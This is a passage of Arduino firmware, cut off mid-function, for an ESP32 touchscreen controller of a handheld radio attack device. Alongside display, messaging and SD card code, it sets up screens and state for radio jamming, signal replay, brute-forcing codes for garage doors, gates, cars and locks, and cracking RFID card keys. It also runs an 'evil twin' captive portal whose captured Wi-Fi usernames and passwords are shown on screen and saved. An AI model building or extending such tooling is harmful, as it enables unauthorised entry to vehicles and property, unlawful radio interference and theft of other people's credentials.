// ############################################################################
//  KODI NODE 1 — Touchscreen UI Controller
//  ESP32-32E R40T: 4" ST7796S touch display, SD card, speaker, I2C OLED
//  Controls Node 0 (ESP32U radio brain) via ESP-NOW
//
//  REQUIRES LIBRARIES (install via Arduino IDE Library Manager):
//    - TFT_eSPI by Bodmer
//    - Adafruit SSD1306
//    - Adafruit GFX Library
//
//  TFT_eSPI SETUP:
//    After installing TFT_eSPI, edit its User_Setup.h file:
//    (usually at: Documents/Arduino/libraries/TFT_eSPI/User_Setup.h)
//    Comment out ALL existing driver/pin definitions, then add:
//      #define ST7796_DRIVER
//      #define TFT_WIDTH  320
//      #define TFT_HEIGHT 480
//      #define TFT_CS   15
//      #define TFT_DC    2
//      #define TFT_RST  -1
//      #define TFT_MOSI 13
//      #define TFT_SCLK 14
//      #define TFT_MISO 12
//      #define TOUCH_CS 33
//      #define SPI_FREQUENCY       40000000
//      #define SPI_READ_FREQUENCY  20000000
//      #define SPI_TOUCH_FREQUENCY  2500000
//      #define LOAD_GLCD
//      #define LOAD_FONT2
//      #define LOAD_FONT4
//      #define SMOOTH_FONT
//      #define USE_HSPI_PORT
//
//  WIRING:
//  On-board (no wiring needed):
//    LCD: CS=15 DC=2 CLK=14 MOSI=13 MISO=12 BL=27
//    Touch: CS=33 IRQ=36
//    SD: CS=5 CLK=18 MOSI=23 MISO=19
//    Speaker: EN=4 DAC=26
//    RGB LED: R=22 G=16 B=17
//    I2C: SCL=25 SDA=32
//  External:
//    OLED SSD1306 128x64: VCC→3.3V GND→GND SCL→GPIO25 SDA→GPIO32
//    Node 0 communication: ESP-NOW (wireless, no wiring needed)
// ############################################################################

#include <SPI.h>
#include <SD.h>
#include <Wire.h>
#include <TFT_eSPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <esp_now.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <time.h>

// ═══════════════════════════════════════════════════════════
//  PIN DEFINITIONS
// ═══════════════════════════════════════════════════════════

#define SD_CS     5
#define SD_SCK   18
#define SD_MISO  19
#define SD_MOSI  23

#define SPK_EN    4
#define SPK_DAC  26

#define LED_R    22
#define LED_G    16
#define LED_B    17

#define I2C_SDA  32
#define I2C_SCL  25

#define LCD_BL   27

// ═══════════════════════════════════════════════════════════
//  THEME COLORS (RGB565)
// ═══════════════════════════════════════════════════════════

#define C_BG      0x0000
#define C_PANEL   0x0200
#define C_GREEN   0x07E0
#define C_DGREEN  0x03E0
#define C_LGREEN  0xAFE5
#define C_CYAN    0x07FF
#define C_WHITE   0xFFFF
#define C_ORANGE  0xFBE0
#define C_YELLOW  0xFFE0
#define C_RED     0xF800
#define C_DGRAY   0x2104
#define C_LGRAY   0x8410
#define C_HEADER  0x0120

// ═══════════════════════════════════════════════════════════
//  SCREEN STATE MACHINE
// ═══════════════════════════════════════════════════════════

enum Screen {
  SCR_BOOT, SCR_CALIB, SCR_HOME,
  SCR_RFID, SCR_CC_TX, SCR_SUBGHZ,
  SCR_SCAN, SCR_RSSI_MON, SCR_RECORD, SCR_REPLAY,
  SCR_JAM, SCR_BRUTE, SCR_CW,
  SCR_SAVED, SCR_SETTINGS,
  SCR_WIFI, SCR_EVIL,
  SCR_RFID_CRACK, SCR_CC_AUTOSCAN,
  SCR_KEYBOARD,
  SCR_OPENER, SCR_OPENER_PICK,
  SCR_NEURAL
};

// ═══════════════════════════════════════════════════════════
//  GLOBALS
// ═══════════════════════════════════════════════════════════

TFT_eSPI tft = TFT_eSPI();
Adafruit_SSD1306 oled(128, 64, &Wire, -1);
SPIClass sdSpi(VSPI);

Screen curScreen  = SCR_BOOT;
Screen prevScreen = SCR_HOME;
uint16_t calData[5];

bool sdOk    = false;
uint32_t sdFreeMB = 0;
bool oledOk  = false;
bool node0Ok = false;

bool pn532Ok   = false;
bool cc1101aOk = false;
bool cc1101bOk = false;

// RFID state
char rfidUid[32] = "";
int  rfidUidLen  = 0;

// CC1101 config
char  activeRadio = 'A';
float ccFreq = 433.92f;
uint8_t ccMod = 0;
uint8_t ccRate = 1;
uint8_t ccPower = 7;
uint8_t ccPktLen = 5;
uint8_t ccPayload[61] = {0x48,0x45,0x4C,0x4C,0x4F};
int  ccBurstCount = 10;
int  ccBurstGap = 50;
uint8_t ccSync1 = 0xD3, ccSync0 = 0x91;

// Scanner state
int8_t  scanData[128];
int     scanSteps = 64;
float   scanStart = 433.0f;
float   scanEnd   = 434.8f;
bool    scanDone  = false;

// Jammer/BF/CW state
bool jamActive = false;
bool bfActive  = false;
bool bfDone    = false;
bool cwActive  = false;

// Recording
bool    recActive = false;
bool    recComplete = false;
int     recLen = 0;

// Replay
bool    replayDone = false;

// Saved files / payload manager
char fileList[20][32];
char fileNames[20][32];
int  fileCount = 0;
int  fileScroll = 0;
uint8_t savedTab = 0;      // 0=CC, 1=REC, 2=RFID, 3=WIFI
bool savedNeedLoad = true;
bool deleteConfirm = false;
int  deleteIdx = -1;
bool wifiViewActive = false;
char wifiViewSsid[33];
char wifiViewUser[65];
char wifiViewPass[65];
char ccProfileName[32] = "";
char rfidName[32] = "";

// RFID crack state
bool crackActive = false;
bool crackKeysLoaded = false;
int  crackKeysTotal = 0;
int  crackSectors = 0;
int  crackFound = 0;
uint32_t crackAttempts = 0;
uint32_t crackTotal = 0;
char crackUid[21] = "";
uint8_t crackSak = 0;
uint32_t lastCrackPoll = 0;

struct CrackResult {
  int sector;
  char keyType;
  char key[13];
  char data[33];
};
CrackResult crackResults[40];
int crackResultCount = 0;

// CC1101 auto-scan state
bool autoScanActive = false;
int  autoScanBand = 0;
int8_t autoScanPeaks[6];
float  autoScanPeakFreq[6];

struct ScanBand {
  float start;
  float end;
  const char* label;
};
static const ScanBand scanBands[] = {
  {299.0, 320.0, "300-315 MHz"},
  {385.0, 395.0, "390 MHz"},
  {432.0, 436.0, "433 MHz"},
  {866.0, 870.0, "868 MHz"},
  {913.0, 918.0, "915 MHz"},
};

// Opener brute-force state
uint8_t openerState = 0;   // 0=category, 1=running, 2=review
uint8_t openerCat = 0;     // 0=garage,1=gate,2=car,3=vend,4=lock,5=home
int  openerFileNum = 0;
int  openerTried = 0;
bool openerRunning = false;
uint32_t lastOpenerSend = 0;
int  openerHistSel = -1;
uint8_t openerStep = 0;       // 0=find/send-init, 1=wait-init, 2=wait-tx
uint32_t openerStepTime = 0;
uint8_t openerSubAttempt = 0; // 0-3: A,B,A,B per profile

#define OPENER_HIST 8
struct OpenerHist {
  int fileNum;
  char name[24];
  float freq;
};
OpenerHist openerHist[OPENER_HIST];
int openerHistCount = 0;

// On-screen keyboard state (TFT_eSPI_Button based, from Bodmer Keypad_480x320 example)
#define KB_MAX_INPUT 31
char kbInput[KB_MAX_INPUT + 1] = "";
int  kbInputLen = 0;
bool kbShift = false;
uint8_t kbPage = 0;           // 0=lowercase, 1=uppercase, 2=numbers/symbols
Screen kbReturnScreen = SCR_RFID;
uint8_t kbSaveType = 0;       // 0=RFID, 1=CC, 2=REC — what we're naming

static const char kbRows0[] = "qwertyuiop";
static const char kbRows1[] = "asdfghjkl";
static const char kbRows2[] = "zxcvbnm";
static const char kbRows0U[] = "QWERTYUIOP";
static const char kbRows1U[] = "ASDFGHJKL";
static const char kbRows2U[] = "ZXCVBNM";
static const char kbRows0N[] = "1234567890";
static const char kbRows1N[] = "-/:;()$&@\"";
static const char kbRows2N[] = ".,?!'";

// ═══════════════════ NEURAL NETWORK LAYER ═══════════════════

enum NnOp : uint8_t {
  NN_OP_RFID_SCAN, NN_OP_RFID_LOOP, NN_OP_RFID_CRACK,
  NN_OP_CC_TX, NN_OP_CC_RX, NN_OP_CC_RECORD, NN_OP_CC_REPLAY,
  NN_OP_CC_JAM, NN_OP_CC_BF, NN_OP_CC_CW, NN_OP_CC_SCAN,
  NN_OP_PING, NN_OP_STATUS, NN_OP_COUNT
};

static const char* nnOpNames[] = {
  "RFID Scan", "RFID Loop", "RFID Crack",
  "CC TX", "CC RX", "CC Record", "CC Replay",
  "CC Jam", "CC BF", "CC CW", "CC Scan",
  "Ping", "Status"
};

struct NnOpStats {
  uint32_t uses;
  uint32_t successes;
  uint32_t failures;
  float avgRespMs;
  float successRate;
};

NnOpStats nnStats[NN_OP_COUNT];

#define NN_SEV_INFO  0
#define NN_SEV_WARN  1
#define NN_SEV_ALERT 2

#define NN_RPT_MAX 40
#define NN_MSG_LEN 72

struct NnReportEntry {
  uint32_t timestamp;
  uint8_t severity;
  char msg[NN_MSG_LEN];
};

NnReportEntry nnReports[NN_RPT_MAX];
int nnRptHead = 0;
int nnRptCount = 0;
int nnRptScroll = 0;

float nnLinkLatency = 0.0f;
float nnLinkSuccess = 1.0f;
uint32_t nnLinkTimeouts = 0;
uint32_t nnLinkExchanges = 0;

uint32_t nnLastTick = 0;
uint32_t nnSessionStart = 0;
uint32_t nnTotalOps = 0;
uint32_t nnMinHeap = 0xFFFFFFFF;
uint32_t nnLastHeapWarn = 0;
uint32_t nnLastLinkWarn = 0;

#define NN_LEARNER_MAGIC 0x4B4F4449
#define NN_LEARNER_VER 2

struct NnLearnerState {
  uint32_t magic;
  uint32_t version;
  uint32_t totalSessions;
  uint32_t lifetimeOps;
  uint32_t opUses[NN_OP_COUNT];
  uint32_t opSuccesses[NN_OP_COUNT];
  float avgSessionSec;
  uint16_t transitions[NN_OP_COUNT][NN_OP_COUNT];
  float opAvgMs[NN_OP_COUNT];
};

NnLearnerState nnLearner;
bool nnLearnerLoaded = false;
bool nnSessionCounted = false;
uint32_t nnLastSave = 0;
uint32_t nnSavedOps = 0;
uint32_t nnSavedOpUses[NN_OP_COUNT];
uint32_t nnSavedOpSuccesses[NN_OP_COUNT];

uint8_t nnConsecFails[NN_OP_COUNT];
uint16_t nnTransitions[NN_OP_COUNT][NN_OP_COUNT];
NnOp nnLastOp = NN_OP_COUNT;
NnOp nnPredictedNext = NN_OP_COUNT;
float nnPredictConf = 0.0f;

#define NN_REC_MAX 4
#define NN_REC_LEN 52
char nnRecs[NN_REC_MAX][NN_REC_LEN];
int nnRecCount = 0;
uint32_t nnLastRecUpdate = 0;

bool neuralViewActive = false;
char neuralViewLines[12][56];
int neuralViewCount = 0;

NnOp nnClassifyCmd(const char* cmd);
void nnObserveCmd(const char* cmd, bool success, uint32_t responseMs);
void nnObserveAsync(const char* msg);
void nnPredictNext();
void nnUpdateRecs();
float nnComputeRisk(NnOp op);
void ledTriggerFlash(bool r, bool g, bool b, uint32_t ms);

// LED flash state
uint32_t ledFlashUntil = 0;
uint8_t  ledFlashR = 0, ledFlashG = 0, ledFlashB = 0;

// Serial response
char rspBuf[2048];
bool rspReady = false;

// UI state
bool needRedraw = true;
int  menuSel = 0;
int  menuScroll = 0;
int  editField = -1;
uint32_t lastTouch = 0;
uint32_t statusUpdate = 0;

// Audio
uint8_t volume = 5;
uint8_t brightness = 200;

// ═══════════════════ WiFi Attack State ═══════════════════
#define MAX_NETS 16
struct WifiNet {
  char ssid[33];
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  uint8_t encType;
};
WifiNet wifiNets[MAX_NETS];
int  wifiNetCount = 0;
int  wifiSel = -1;
bool wifiScanned = false;

bool evilTwinActive = false;
char capturedUser[64] = "";
char capturedPass[65] = "";
int  portalClients = 0;

WebServer* wifiServer = nullptr;
DNSServer* wifiDns = nullptr;

// ═══════════════════════════════════════════════════════════
//  AUDIO
// ═══════════════════════════════════════════════════════════

void toneBeep(int freq, int ms) {
  if (volume == 0) return;
  ledcAttach(SPK_DAC, freq, 8);
  ledcWrite(SPK_DAC, volume * 12);
  delay(ms);
  ledcWrite(SPK_DAC, 0);
  ledcDetach(SPK_DAC);
}

void clickOk()   { toneBeep(2200, 30); }
void clickBack() { toneBeep(900, 25); }
void clickNav()  { toneBeep(1800, 20); }

void ledSet(bool r, bool g, bool b) {
  digitalWrite(LED_R, r ? HIGH : LOW);
  digitalWrite(LED_G, g ? HIGH : LOW);
  digitalWrite(LED_B, b ? HIGH : LOW);
}
void ledOff()    { ledSet(false, false, false); }
void ledRed()    { ledSet(true,  false, false); }
void ledGreen()  { ledSet(false, true,  false); }
void ledBlue()   { ledSet(false, false, true);  }
void ledCyan()   { ledSet(false, true,  true);  }
void ledYellow() { ledSet(true,  true,  false); }
void ledWhite()  { ledSet(true,  true,  true);  }

void ledFlash(void (*colorFn)(), int count, int onMs, int offMs) {
  for (int i = 0; i < count; i++) {
    colorFn();
    delay(onMs);
    ledOff();
    if (i < count - 1) delay(offMs);
  }
}

// ═══════════════════════════════════════════════════════════
//  ESP-NOW COMMUNICATION
// ═══════════════════════════════════════════════════════════

static const uint8_t espBroadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

#define ESP_MSG_SLOTS 8
#define ESP_MSG_SIZE  512
char espMsgSlots[ESP_MSG_SLOTS][ESP_MSG_SIZE];
volatile int espMsgHead = 0;
volatile int espMsgTail = 0;

static char espAssembly[2048];
static int  espAssemblyPos = 0;

void onEspRecv(const esp_now_recv_info_t* info, const uint8_t* data, int len) {
  if (len <= 0) return;
  bool more = (len == 250 && data[249] == 0x01);
  int copyLen = more ? 249 : len;
  if (espAssemblyPos + copyLen < (int)sizeof(espAssembly) - 1) {
    memcpy(espAssembly + espAssemblyPos, data, copyLen);
    espAssemblyPos += copyLen;
  }
  if (!more) {
    espAssembly[espAssemblyPos] = '\0';
    int next = (espMsgHead + 1) % ESP_MSG_SLOTS;
    if (next != espMsgTail) {
      strlcpy(espMsgSlots[espMsgHead], espAssembly, ESP_MSG_SIZE);
      espMsgHead = next;
    }
    espAssemblyPos = 0;
  }
}

bool espMsgAvail() { return espMsgHead != espMsgTail; }

const char* espMsgRead() {
  if (!espMsgAvail()) return nullptr;
  const char* msg = espMsgSlots[espMsgTail];
  espMsgTail = (espMsgTail + 1) % ESP_MSG_SLOTS;
  return msg;
}

volatile bool espSendDone = true;

void onEspSent(const esp_now_send_info_t *info, esp_now_send_status_t status) {
  espSendDone = true;
}

void espWaitSend() {
  uint32_t t = millis();
  while (!espSendDone && millis() - t < 100) delay(1);
}

void espSend(const char* msg) {
  int len = strlen(msg);
  espWaitSend();
  if (len <= 249) {
    espSendDone = false;
    esp_err_t err = esp_now_send(espBroadcast, (const uint8_t*)msg, len);
    if (err != ESP_OK) { espSendDone = true; delay(5); }
    return;
  }
  int off = 0;
  while (off < len) {
    int remain = len - off;
    espWaitSend();
    if (remain > 249) {
      uint8_t pkt[250];
      memcpy(pkt, msg + off, 249);
      pkt[249] = 0x01;
      espSendDone = false;
      esp_err_t err = esp_now_send(espBroadcast, pkt, 250);
      if (err != ESP_OK) { espSendDone = true; delay(5); }
      off += 249;
    } else {
      espSendDone = false;
      esp_err_t err = esp_now_send(espBroadcast, (const uint8_t*)(msg + off), remain);
      if (err != ESP_OK) { espSendDone = true; delay(5); }
      off += remain;
    }
  }
}

void espNowSetup() {
  if (esp_now_init() != ESP_OK) {
    Serial.println(F("ESP-NOW init FAILED"));
    return;
  }
  esp_now_register_recv_cb(onEspRecv);
  esp_now_register_send_cb(onEspSent);
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, espBroadcast, 6);
  peer.channel = 0;
  peer.encrypt = false;
  if (!esp_now_is_peer_exist(espBroadcast))
    esp_now_add_peer(&peer);
  Serial.println(F("ESP-NOW: OK"));
}

void espNowRestart() {
  esp_now_deinit();
  espSendDone = true;
  espAssemblyPos = 0;
  espNowSetup();
}

// ═══════════════════════════════════════════════════════════
//  NODE 0 PROTOCOL (over ESP-NOW)
// ═══════════════════════════════════════════════════════════

void sendCmd(const char* fmt, ...) {
  char buf[2048];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  espSend(buf);
  Serial.print("[CMD] "); Serial.println(buf);
}

bool waitReply(uint32_t timeoutMs = 2000) {
  rspReady = false;
  uint32_t start = millis();
  while (millis() - start < timeoutMs) {
    if (espMsgAvail()) {
      const char* msg = espMsgRead();
      if (msg[0] == '!') {
        handleAsync(msg);
        continue;
      }
      strncpy(rspBuf, msg, sizeof(rspBuf) - 1);
      rspBuf[sizeof(rspBuf) - 1] = '\0';
      rspReady = true;
      Serial.print("[RSP] "); Serial.println(rspBuf);
      return true;
    }
    delay(1);
  }
  return false;
}

bool sendAndWait(const char* cmd, uint32_t timeout = 2000) {
  uint32_t t0 = millis();
  if (timeout == 2000) {
    NnOp op = nnClassifyCmd(cmd);
    NnOpStats& s = nnStats[op];
    if (s.uses >= 10 && s.avgRespMs > 0 && nnConsecFails[op] < 2) {
      uint32_t adj = (uint32_t)(s.avgRespMs * 3.0f);
      if (adj < 500) adj = 500;
      if (adj > 5000) adj = 5000;
      timeout = adj;
    }
  }
  espSend(cmd);
  Serial.print("[CMD] "); Serial.println(cmd);
  bool ok = waitReply(timeout);
  nnObserveCmd(cmd, ok, millis() - t0);
  return ok;
}

void saveCrackResults();

void handleAsync(const char* msg) {
  Serial.print("[ASYNC] "); Serial.println(msg);
  nnObserveAsync(msg);
  if (strncmp(msg, "!RF,", 4) == 0) {
    int len = atoi(msg + 4);
    const char* hex = strchr(msg + 4, ',');
    if (hex && len > 0) {
      hex++;
      rfidUidLen = len;
      strncpy(rfidUid, hex, sizeof(rfidUid)-1);
      if (curScreen == SCR_RFID) needRedraw = true;
    }
  }
  else if (strncmp(msg, "!REC_FULL", 9) == 0) {
    recActive = false;
    recComplete = true;
    ledFlash(ledGreen, 3, 100, 100);
    toneBeep(800, 200);
    if (curScreen == SCR_RECORD) needRedraw = true;
  }
  else if (strncmp(msg, "!RY_DONE", 8) == 0) {
    replayDone = true;
    ledFlash(ledGreen, 3, 100, 100);
    toneBeep(800, 200);
    if (curScreen == SCR_REPLAY) needRedraw = true;
  }
  else if (strncmp(msg, "!BF_DONE", 8) == 0) {
    bfActive = false;
    bfDone = true;
    ledFlash(ledGreen, 3, 100, 100);
    toneBeep(800, 200);
    if (curScreen == SCR_BRUTE) needRedraw = true;
  }
  else if (strncmp(msg, "!RK,", 4) == 0 && crackResultCount < 40) {
    char rkBuf[128];
    strncpy(rkBuf, msg, sizeof(rkBuf) - 1);
    rkBuf[sizeof(rkBuf) - 1] = '\0';
    int sector = atoi(rkBuf + 4);
    char* p = strchr(rkBuf + 4, ',');
    if (p) {
      char kt = *(++p);
      p = strchr(p, ',');
      if (p) {
        p++;
        char* d = strchr(p, ',');
        if (d) {
          *d = '\0'; d++;
          crackResults[crackResultCount].sector = sector;
          crackResults[crackResultCount].keyType = kt;
          strncpy(crackResults[crackResultCount].key, p, 12);
          crackResults[crackResultCount].key[12] = '\0';
          strncpy(crackResults[crackResultCount].data, d, 32);
          crackResults[crackResultCount].data[32] = '\0';
          crackResultCount++;
          crackFound = crackResultCount;
          if (curScreen == SCR_RFID_CRACK) needRedraw = true;
        }
      }
    }
  }
  else if (strncmp(msg, "!RC_DONE", 8) == 0) {
    crackActive = false;
    ledFlash(ledGreen, 3, 100, 100);
    toneBeep(800, 200);
    if (crackResultCount > 0) saveCrackResults();
    if (curScreen == SCR_RFID_CRACK) needRedraw = true;
  }
}

void checkAsync() {
  while (espMsgAvail()) {
    const char* msg = espMsgRead();
    if (msg[0] == '!') handleAsync(msg);
  }
}

// ═══════════════════════════════════════════════════════════
//  OLED STATUS DISPLAY
// ═══════════════════════════════════════════════════════════

const char* modName(int m);
const char* rateName(int r);
const char* pwrName(int p);

void oledUpdate() {
  if (!oledOk) return;
  if (millis() - statusUpdate < 500) return;
  statusUpdate = millis();

  oled.clearDisplay();
  oled.setTextColor(SSD1306_WHITE);
  oled.setTextSize(1);

  switch (curScreen) {
    case SCR_HOME:
    default: {
      oled.setCursor(0, 0); oled.print(F("KODI SYSTEM"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 12); oled.printf("PN532:  %s", pn532Ok ? "OK" : "--");
      oled.setCursor(0, 22); oled.printf("CC1101A:%s", cc1101aOk ? "OK" : "--");
      oled.setCursor(0, 32); oled.printf("CC1101B:%s", cc1101bOk ? "OK" : "--");
      oled.setCursor(0, 42); oled.printf("ESP-NOW:%s", node0Ok ? "ONLINE" : "OFF");
      uint32_t sec = millis() / 1000;
      oled.setCursor(0, 52); oled.printf("Up: %luh %lum", sec / 3600, (sec % 3600) / 60);
      break;
    }
    case SCR_RFID: {
      oled.setCursor(0, 0); oled.print(F("RFID"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      if (rfidUidLen > 0) {
        oled.setCursor(0, 14); oled.print(F("Card loaded:"));
        oled.setCursor(0, 26); oled.print(rfidUid);
      } else {
        oled.setCursor(0, 14); oled.print(F("No card loaded"));
      }
      break;
    }
    case SCR_CC_TX: {
      oled.setCursor(0, 0); oled.printf("CC1101-%c", activeRadio);
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
      oled.setCursor(0, 26); oled.printf("Mod:%s Rate:%s", modName(ccMod), rateName(ccRate));
      oled.setCursor(0, 38); oled.printf("Pwr:%s dBm", pwrName(ccPower));
      oled.setCursor(0, 50); oled.printf("Len:%d bytes", ccPktLen);
      break;
    }
    case SCR_SUBGHZ: {
      oled.setCursor(0, 0); oled.print(F("SUB-GHZ TOOLS"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("Radio: %c", activeRadio);
      oled.setCursor(0, 26); oled.printf("%.2f MHz", ccFreq);
      break;
    }
    case SCR_SCAN: {
      oled.setCursor(0, 0); oled.print(F("FREQ SCANNER"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("Radio: %c", activeRadio);
      oled.setCursor(0, 26); oled.printf("%.2f MHz", ccFreq);
      break;
    }
    case SCR_RSSI_MON: {
      oled.setCursor(0, 0); oled.print(F("RSSI MONITOR"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
      oled.setCursor(0, 26); oled.print(F("Monitoring..."));
      break;
    }
    case SCR_RECORD: {
      oled.setCursor(0, 0); oled.print(F("RECORD SIGNAL"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
      oled.setCursor(0, 28);
      if (recActive) { oled.setTextSize(2); oled.print(F("RECORDING")); }
      else oled.print(F("Idle"));
      break;
    }
    case SCR_REPLAY: {
      oled.setCursor(0, 0); oled.print(F("REPLAY"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
      break;
    }
    case SCR_JAM: {
      if (jamActive) {
        oled.setTextSize(2);
        oled.setCursor(0, 0); oled.print(F("JAMMING"));
        oled.setTextSize(1);
        oled.drawLine(0, 17, 127, 17, SSD1306_WHITE);
        oled.setCursor(0, 22); oled.printf("%.2f MHz", ccFreq);
        oled.setCursor(0, 34); oled.print(F(">>> ACTIVE <<<"));
      } else {
        oled.setCursor(0, 0); oled.print(F("JAMMER"));
        oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
        oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
        oled.setCursor(0, 26); oled.print(F("Idle"));
      }
      break;
    }
    case SCR_BRUTE: {
      oled.setCursor(0, 0); oled.print(F("BRUTE FORCE"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
      oled.setCursor(0, 28);
      if (bfActive) { oled.setTextSize(2); oled.print(F("RUNNING")); }
      else oled.print(F("Idle"));
      break;
    }
    case SCR_CW: {
      oled.setCursor(0, 0); oled.print(F("CW TEST"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14); oled.printf("%.2f MHz", ccFreq);
      oled.setCursor(0, 28);
      if (cwActive) { oled.setTextSize(2); oled.print(F("TX ACTIVE")); }
      else oled.print(F("Idle"));
      break;
    }
    case SCR_WIFI: {
      oled.setCursor(0, 0); oled.print(F("WIFI"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      break;
    }
    case SCR_EVIL: {
      oled.setCursor(0, 0); oled.print(F("CAPTIVE PORTAL"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      if (evilTwinActive) {
        oled.setCursor(0, 14); oled.print(F("ACTIVE"));
        oled.setCursor(0, 26); oled.printf("Clients: %d", portalClients);
        if (capturedPass[0]) {
          oled.setCursor(0, 38); oled.print(F("CAPTURED:"));
          if (capturedUser[0]) { oled.setCursor(0, 48); oled.printf("U:%s", capturedUser); }
          oled.setCursor(0, 56); oled.printf("P:%s", capturedPass);
        }
      } else {
        oled.setCursor(0, 14); oled.print(F("Idle"));
      }
      break;
    }
    case SCR_RFID_CRACK: {
      oled.setCursor(0, 0); oled.print(F("RFID CRACK"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      if (crackActive) {
        oled.setCursor(0, 14); oled.print(F("CRACKING..."));
        oled.setCursor(0, 26); oled.printf("Try: %lu", crackAttempts);
        oled.setCursor(0, 38); oled.printf("Found: %d", crackFound);
      } else {
        oled.setCursor(0, 14); oled.print(F("Idle"));
        oled.setCursor(0, 26); oled.printf("Found: %d", crackFound);
      }
      break;
    }
    case SCR_CC_AUTOSCAN: {
      oled.setCursor(0, 0); oled.print(F("AUTO SCAN"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      oled.setCursor(0, 14);
      if (autoScanActive) oled.print(F("SCANNING..."));
      else oled.print(F("Idle"));
      break;
    }
    case SCR_SAVED: {
      oled.setCursor(0, 0); oled.print(F("SAVED FILES"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      break;
    }
    case SCR_SETTINGS: {
      oled.setCursor(0, 0); oled.print(F("SETTINGS"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      break;
    }
    case SCR_OPENER:
    case SCR_OPENER_PICK: {
      oled.setCursor(0, 0); oled.print(F("OPENER"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      if (openerRunning) {
        static const char* cn[] = {"GAR","GAT","CAR","VND","LCK","HOM"};
        oled.setCursor(0, 14); oled.printf("Cat: %s", cn[openerCat]);
        oled.setCursor(0, 26); oled.printf("Tried: %d", openerTried);
        oled.setCursor(0, 40); oled.print(F("RUNNING..."));
      } else {
        oled.setCursor(0, 14); oled.print(F("Idle"));
      }
      break;
    }
    case SCR_KEYBOARD: {
      oled.setCursor(0, 0); oled.print(F("KEYBOARD"));
      oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
      break;
    }
  }

  oled.display();
}

// ═══════════════════════════════════════════════════════════
//  SD CARD
// ═══════════════════════════════════════════════════════════

void sdInit() {
  sdSpi.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
  sdOk = SD.begin(SD_CS, sdSpi);
  if (sdOk) {
    if (!SD.exists("/kodi"))      SD.mkdir("/kodi");
    if (!SD.exists("/kodi/cc"))   SD.mkdir("/kodi/cc");
    if (!SD.exists("/kodi/rec"))  SD.mkdir("/kodi/rec");
    if (!SD.exists("/kodi/rfid")) SD.mkdir("/kodi/rfid");
    if (!SD.exists("/kodi/wifi")) SD.mkdir("/kodi/wifi");
    if (!SD.exists("/kodi/keys")) SD.mkdir("/kodi/keys");
    if (!SD.exists("/kodi/neural")) SD.mkdir("/kodi/neural");
    if (!SD.exists("/kodi/nn")) SD.mkdir("/kodi/nn");
    uint64_t total = SD.totalBytes();
    uint64_t used = SD.usedBytes();
    sdFreeMB = (uint32_t)((total - used) / (1024ULL * 1024ULL));
  }
}

void sdUpdateFree() {
  if (!sdOk) return;
  uint64_t total = SD.totalBytes();
  uint64_t used = SD.usedBytes();
  sdFreeMB = (uint32_t)((total - used) / (1024ULL * 1024ULL));
}

void getTimestampLA(char* buf, int bufLen) {
  struct tm ti;
  if (getLocalTime(&ti, 50)) {
    int hr = ti.tm_hour % 12;
    if (hr == 0) hr = 12;
    snprintf(buf, bufLen, "%d/%d/%02d %d:%02d%s",
      ti.tm_mon + 1, ti.tm_mday, ti.tm_year % 100,
      hr, ti.tm_min, ti.tm_hour >= 12 ? "pm" : "am");
  } else {
    snprintf(buf, bufLen, "no-clock");
  }
}

void sdSaveRfidNamed(const char* userName) {
  if (!sdOk || rfidUidLen == 0) return;
  int n = 1;
  char path[48];
  do { snprintf(path, sizeof(path), "/kodi/rfid/rfid_%03d.txt", n++); } while (SD.exists(path) && n < 999);
  if (SD.exists(path)) return;
  File f = SD.open(path, FILE_WRITE);
  if (f) {
    char ts[32];
    getTimestampLA(ts, sizeof(ts));
    if (userName[0]) {
      f.printf("KODI,RFID,1.0\nname=%s\nuid=%s\nlen=%d\ntime=%s\n", userName, rfidUid, rfidUidLen, ts);
    } else {
      f.printf("KODI,RFID,1.0\nname=RFID %s %s\nuid=%s\nlen=%d\ntime=%s\n", rfidUid, ts, rfidUid, rfidUidLen, ts);
    }
    f.close();
  }
}

void sdSaveCcProfile() {
  if (!sdOk) return;
  int n = 1;
  char path[48];
  do { snprintf(path, sizeof(path), "/kodi/cc/cc_%03d.txt", n++); } while (SD.exists(path) && n < 999);
  if (SD.exists(path)) return;
  File f = SD.open(path, FILE_WRITE);
  if (f) {
    f.printf("KODI,CC,1.0\n");
    if (ccProfileName[0]) f.printf("name=%s\n", ccProfileName);
    else f.printf("name=User %.2fMHz\n", ccFreq);
    f.printf("freq=%.2f\nmod=%d\nrate=%d\npower=%d\n", ccFreq, ccMod, ccRate, ccPower);
